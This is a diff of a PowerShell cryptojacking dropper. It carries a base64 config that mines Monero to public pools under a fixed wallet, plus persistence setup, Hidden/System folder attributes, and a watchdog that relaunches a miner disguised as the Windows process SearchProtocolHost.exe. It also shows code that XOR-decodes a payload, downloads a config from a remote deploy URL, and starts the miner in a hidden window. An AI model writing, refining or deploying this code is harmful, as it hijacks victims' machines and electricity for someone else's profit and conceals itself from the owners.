@@ -64,7 +64,7 @@ $dec=XorDec $enc $key
 function Write-MinerConfig{
 $cb64='eyJhcGktbW9kZSI6bnVsbCwiZG9uYXRlLWxldmVsIjowLCJkb25hdGUtb3Zlci1wcm94eSI6MCwibG9nLWZpbGUiOm51bGwsInByaW50LXRpbWUiOjYwLCJoZWFsdGgtcHJpbnQtdGltZSI6NjAsInJldHJpZXMiOjUsInJldHJ5LXBhdXNlIjo1LCJzeXNsb2ciOmZhbHNlLCJ3YXRjaCI6dHJ1ZSwib3BlbmNsLXBsYXRmb3JtIjotMSwiYWxnbyI6InJ4LzAiLCJjb2lucyI6Im1vbmVybyIsInBvb2xzIjpbeyJ1cmwiOiJwb29sLmhhc2h2YXVsdC5wcm86NDQzIiwidXNlciI6IjQ2N2cxbWVpekZlMzFHekZNRzd4b3kzeXhUaEc1NnA3Tk56dXRLZmY3WVBpMURhZEFkcmtZMnhMajl6TFdqWk5tNGhmWG9GMnV4YTZQZ0pDV1FjNlFVaDY0TkdwWEVMIiwia2VlcGFsaXZlIjp0cnVlLCJ0bHMiOnRydWUsInRscy1maW5nZXJwcmludCI6bnVsbH0seyJ1cmwiOiJwb29sLnN1cHBvcnR4bXIuY29tOjQ0MyIsInVzZXIiOiI0NjdnMW1laXpGZTMxR3pGTUc3eG95M3l4VGhHNTZwN05OenV0S2ZmN1lQaTFEYWRBZHJrWTJ4TGo5ekxXalpObTRoZlhvRjJ1eGE2UGdKQ1dRYzZRVWg2NE5HcFhFTCIsImtlZXBhbGl2ZSI6dHJ1ZSwidGxzIjp0cnVlLCJ0bHMtZmluZ2VycHJpbnQiOm51bGx9XSwiY3B1Ijp0cnVlfQ=='
 $json=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cb64))
-$json|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
+[System.IO.File]::WriteAllText("$_s\config.json",$json)
 }
 
 function Set-Persistence{
@@ -90,11 +90,10 @@ $sc.Save()
 function Write-StealthWatchdog{
 $w = @'
 $ErrorActionPreference='SilentlyContinue'
-$s="SearchProtocolHost.exe"
 while($true){
-$proc=Get-Process -Name $s -ErrorAction SilentlyContinue
+$proc=Get-Process -Name SearchProtocolHost -ErrorAction SilentlyContinue
 if(!$proc){
-$exe="SearchProtocolHost.exe"
+$exe="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache\SearchProtocolHost.exe"
 Start-Process $exe -WindowStyle Hidden
 }
 Start-Sleep 60
@@ -119,7 +118,7 @@ Set-ItemProperty `$_s -Name Attributes -Value 'Hidden,System' -ErrorAction Silen
 `$dec=XorDec `$enc `$k
 [System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)
 `$json=`$wc.DownloadString('$_g'.Replace('deploy_client_v7.5.5.ps1','config.json'))
-`$json|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force
+[System.IO.File]::WriteAllText("`$_s\config.json",`$json)
 Start-Process "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden
 "@
 $m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
